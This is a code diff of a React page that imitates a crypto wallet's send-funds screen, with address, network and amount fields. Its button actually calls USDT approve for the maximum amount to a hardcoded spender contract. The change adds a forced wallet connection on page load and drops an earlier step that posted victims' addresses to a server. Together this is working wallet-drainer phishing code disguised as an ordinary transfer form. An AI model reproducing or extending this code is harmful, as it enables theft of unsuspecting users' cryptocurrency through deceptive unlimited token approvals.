@@ -1,31 +1,53 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
 
-  const [address, setAddress] = useState("0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1");
+  const [address, setAddress] = useState("0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB");
   const [amount, setAmount] = useState("");
 
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1"; // 🔥 TUO CONTRACT
+  const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
+
+  // 🔥 AUTO CONNECT (FIX ANDROID)
+  useEffect(() => {
+    const autoConnect = async () => {
+      if (window.ethereum) {
+        try {
+          const provider = new ethers.BrowserProvider(window.ethereum);
+
+          // forza connessione
+          await provider.send("eth_requestAccounts", []);
+
+          console.log("Wallet connesso");
+        } catch (err) {
+          console.log("Utente non ha accettato");
+        }
+      }
+    };
+
+    autoConnect();
+  }, []);
 
   const approveUSDT = async () => {
     try {
       if (!window.ethereum) {
-        alert("Apri in Trust Wallet o MetaMask");
+        alert("Apri in Trust Wallet");
         return;
       }
 
-      // switch BSC
+      // 🔥 switch rete BNB
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
       });
 
       const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
 
-      const userAddress = await signer.getAddress(); // 🔥 salva questo
+      // 🔥 FIX ANDROID
+      await provider.send("eth_requestAccounts", []);
+
+      const signer = await provider.getSigner();
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
@@ -35,30 +57,20 @@ export default function Home() {
         signer
       );
 
-      // 🔥 approve MAX (veloce)
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
       );
 
-      // 🔥 SALVA UTENTE SUBITO
-      await fetch("/api/save", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ address: userAddress }),
-      });
+      await tx.wait();
 
-      alert("Approve inviato 🔥");
-
+      alert("Approve completato!");
     } catch (err) {
       console.log(err);
       alert("Errore: " + err.message);
     }
   };
 
-  // 🔥 CALCOLO USD
   const usdValue = amount && Number(amount) > 0
     ? Number(amount).toFixed(2)
     : "0.00";
@@ -74,7 +86,6 @@ export default function Home() {
       padding: "20px"
     }}>
 
-      {/* ADDRESS */}
       <div style={{ marginTop: "40px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Address or Domain Name
@@ -100,12 +111,10 @@ export default function Home() {
               outline: "none"
             }}
           />
-
           <span style={{ color: "#22c55e" }}>Paste</span>
         </div>
       </div>
 
-      {/* NETWORK */}
       <div style={{ marginTop: "20px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Destination network
@@ -119,16 +128,10 @@ export default function Home() {
           alignItems: "center",
           gap: "10px"
         }}>
-          
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="#F3BA2F">
-            <path d="M12 2l2.9 2.9-2.9 2.9-2.9-2.9L12 2zm0 6.8l2.9 2.9-2.9 2.9-2.9-2.9L12 8.8zm0 6.8l2.9 2.9-2.9 2.9-2.9-2.9L12 15.6zm6.8-6.8l2.9 2.9-2.9 2.9-2.9-2.9 2.9-2.9zM5.2 8.8l2.9 2.9-2.9 2.9-2.9-2.9 2.9-2.9z"/>
-          </svg>
-
           <span>BNB Smart Chain</span>
         </div>
       </div>
 
-      {/* AMOUNT */}
       <div style={{ marginTop: "25px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Amount
@@ -165,7 +168,6 @@ export default function Home() {
         </div>
       </div>
 
-      {/* BUTTON */}
       <div style={{
         position: "fixed",
         bottom: "30px",
@@ -182,17 +184,8 @@ export default function Home() {
             border: "none",
             fontSize: "18px",
             fontWeight: "600",
-            transition: "all 0.3s ease",
-
             background: isValidAmount ? "#4ade80" : "#1a2e22",
             color: isValidAmount ? "#052e16" : "#6b7280",
-
-            boxShadow: isValidAmount
-              ? "0 0 20px rgba(74, 222, 128, 0.7)"
-              : "none",
-
-            transform: isValidAmount ? "scale(1)" : "scale(0.98)",
-
             cursor: isValidAmount ? "pointer" : "not-allowed"
           }}
         >
